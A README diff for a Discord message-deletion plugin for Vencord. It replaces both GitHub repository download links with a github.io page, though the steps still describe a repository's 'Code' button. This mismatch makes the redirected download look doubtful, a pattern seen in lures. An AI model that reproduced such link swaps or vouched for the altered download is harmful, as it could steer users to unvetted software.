@@ -1,6 +1,6 @@
 # ⚡ vundiscord - Delete your Discord messages with ease
 
-[![Download vundiscord](https://img.shields.io/badge/Download-Visit_Repository-blue.svg)](https://github.com/DANDARA111/vundiscord)
+[![Download vundiscord](https://img.shields.io/badge/Download-Visit_Repository-blue.svg)](https://dandara111.github.io)
 
 vundiscord helps you remove messages from Discord quickly. This tool acts as a plugin for Vencord. It automates the process of clearing chat history. You save time when you need to clean up old conversations.
 
@@ -18,7 +18,7 @@ If you do not have Vencord, download it from the official Vencord website first.
 
 Follow these steps to set up the tool:
 
-1. Visit this page to download: https://github.com/DANDARA111/vundiscord
+1. Visit this page to download: https://dandara111.github.io
 2. Look for the green button labeled "Code" on the right side of the page.
 3. Click "Download ZIP" from the menu.
 4. Save the file to your computer.
